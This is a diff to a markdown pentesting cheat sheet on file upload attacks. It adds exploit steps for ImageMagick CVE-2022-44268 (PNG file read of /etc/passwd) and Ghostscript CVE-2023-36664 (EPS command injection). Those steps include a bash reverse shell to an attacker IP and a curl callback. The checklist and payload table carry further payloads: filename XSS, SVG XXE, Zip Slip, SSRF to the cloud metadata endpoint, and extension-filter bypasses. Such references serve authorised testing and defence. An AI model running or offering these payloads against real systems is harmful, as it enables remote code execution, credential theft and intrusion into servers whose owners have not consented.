@@ -1,6 +1,6 @@
 # File Upload Attacks
 
-#FileUpload #WebSecurity #RCE #WebShell #MIME #ContentType
+#FileUpload #WebSecurity #RCE #WebShell #MIME #ContentType #ZipSlip #SSTI #SSRF #ImageMagick #Ghostscript #exiftool #ffuf #BurpSuite #Polyglot
 
 ## What is this?
 
@@ -12,10 +12,11 @@ File upload endpoints that fail to validate file type, content, or name allow at
 
 | Tool | Purpose |
 |---|---|
-| `ffuf` / `Burp Intruder` | Fuzz extensions, content-types, filenames |
-| `Burp Suite` | Intercept and modify upload requests |
-| `Turbo Intruder` | Race condition exploitation |
-| `exiftool` | Inject payloads into EXIF metadata / embed PHP in images |
+| [[Tools/Scanning/ffuf\|ffuf]] | Fuzz extensions, content-types, filenames |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept and modify upload requests; Intruder for extension fuzzing |
+| [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder) | Burp extension — race condition exploitation |
+| [[Tools/Recon/exiftool\|exiftool]] | Inject payloads into EXIF metadata / embed PHP in images |
+| [evilarc](https://github.com/ptoomey3/evilarc) | Build archives with traversal paths for Zip Slip |
 | `file` | Check magic bytes of a file |
 | `hexedit` | Manually edit binary file headers to inject payloads |
 
@@ -633,6 +634,52 @@ curl "http://target.com/uploads/exploit.jpg"
 # Or use a Burp Collaborator/interactsh URL in the payload
 ```
 
+> [!note] ImageTragick is from 2016 and long patched on anything maintained. The two below are the image-processing bugs actually worth testing on a modern target.
+
+### ImageMagick PNG Arbitrary File Read (CVE-2022-44268)
+
+If ImageMagick *resizes or converts* an uploaded PNG, a `tEXt` chunk whose keyword is `profile` makes it treat the accompanying string as a **filename** and embed that file's contents into the output image as a raw profile. Upload the PNG, let the server process it, download the result, and read the file back out. Affects ImageMagick up to 7.1.0-49 — no code execution, but arbitrary file read as the web user is usually enough to reach config files and keys.
+
+```bash
+# Build the malicious PNG
+git clone https://github.com/entr0pie/CVE-2022-44268
+cd CVE-2022-44268
+python3 CVE-2022-44268.py /etc/passwd
+# produces image.png with the profile chunk pointing at /etc/passwd
+
+# Upload it, let the app resize/convert it, then fetch the processed copy
+curl -s -X POST http://<TARGET>/upload -F "file=@image.png"
+curl -s http://<TARGET>/uploads/processed_image.png -o out.png
+
+# Extract the embedded profile and decode it (it comes back as hex)
+identify -verbose out.png | grep -A99999 "Raw profile type" | tail -n +2 \
+  | tr -d '\n ' | xxd -r -p
+```
+
+> [!tip] The file only comes back if the server returns the *processed* image to you. If the app resizes on upload but never serves the result, this is a dead end — confirm you can retrieve the output before spending time on it.
+
+### Ghostscript Command Injection via ImageMagick (CVE-2023-36664)
+
+ImageMagick **delegates PostScript/EPS/PDF handling to Ghostscript by default**, so any app that runs uploads through ImageMagick inherits Ghostscript's attack surface whether the developers know it or not. Ghostscript ≤ 10.01.2 fails to validate permissions for pipe devices, so a filename beginning with `%pipe%` or `|` executes as a shell command.
+
+```bash
+# Generate a malicious EPS
+git clone https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
+cd CVE-2023-36664-Ghostscript-command-injection
+python3 CVE_2023_36664_exploit.py --generate --payload "curl http://10.10.14.5:8000/pwned" --filename exploit.eps
+
+# Reverse shell variant
+python3 CVE_2023_36664_exploit.py --generate \
+  --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'" --filename exploit.eps
+
+# Upload — it fires when the server converts/thumbnails the file
+curl -s -X POST http://<TARGET>/upload -F "file=@exploit.eps"
+```
+
+> [!tip] Rename to `.jpg`/`.png` if the upload filter only checks the extension — ImageMagick sniffs content, so it will still route the file to the Ghostscript delegate. This is why an "images only" whitelist does not close this off.
+
+> [!warning] Patched in Ghostscript 10.01.2 (July 2023). Version-check first via an error message or `identify -version` output if you can reach it — blind attempts are noisy and write to the target's logs.
+
 ---
 
 ## DoS via File Upload
@@ -767,7 +814,7 @@ url=http://<collaborator-url>/test
 [ ] Try case sensitivity: shell.PHP, shell.Php, shell.pHp
 [ ] Try double extension: shell.jpg.php, shell.php.jpg
 [ ] Try null byte: shell.php%00.jpg
-[ ] Try filename length truncation: shell.php + 241xA + .jpg
+[ ] Try filename length truncation: shell.php + 242xA + .jpg (= 255 total)
 [ ] Generate char injection wordlist and fuzz
 [ ] Change Content-Type to image/jpeg — fuzz full list
 [ ] Add GIF8 magic bytes — check if MIME filter bypassed
@@ -779,7 +826,8 @@ url=http://<collaborator-url>/test
 [ ] XSS in filename — app reflects filename in response? try "><img src=x onerror=alert(1)>.jpg
 [ ] Race condition if validation window exists
 [ ] Zip/tar upload? → test Zip Slip path traversal
-[ ] Image processing on server? → test ImageTragick (MVG/SVG payload)
+[ ] Image processing on server? → test ImageTragick (MVG/SVG), CVE-2022-44268 (PNG file read), CVE-2023-36664 (EPS → Ghostscript RCE)
+[ ] Processed image returned to you? → required for the CVE-2022-44268 read-back
 [ ] Template files accepted? → test SSTI ({{7*7}}, ${7*7})
 [ ] Upload-from-URL field? → test SSRF (127.0.0.1, metadata, file://)
 ```
@@ -805,11 +853,13 @@ url=http://<collaborator-url>/test
 | SVG XXE | `<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` |
 | Stored XSS via filename | `"><img src=x onerror=alert(window.origin)>.jpg` |
 | Zip Slip path traversal | `python3 evilarc/evilarc.py shell.php -o unix -d 6 -p var/www/html/ -f evil.zip` |
+| ImageMagick PNG file read (CVE-2022-44268) | `python3 CVE-2022-44268.py /etc/passwd` → upload → `identify -verbose out.png` → `xxd -r -p` |
+| Ghostscript RCE via ImageMagick (CVE-2023-36664) | `python3 CVE_2023_36664_exploit.py --generate --payload "<cmd>" --filename exploit.eps` |
 | SSTI probe (post-upload template render) | `{{7*7}}` (Jinja2/Twig) or `${7*7}` (Freemarker/Mako) |
 | Upload-from-URL SSRF | `url=http://169.254.169.254/latest/meta-data/` |
 
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-07-27*
-*Model: claude-sonnet-5*
+*Updated: 2026-07-30*
+*Model: claude-opus-5*
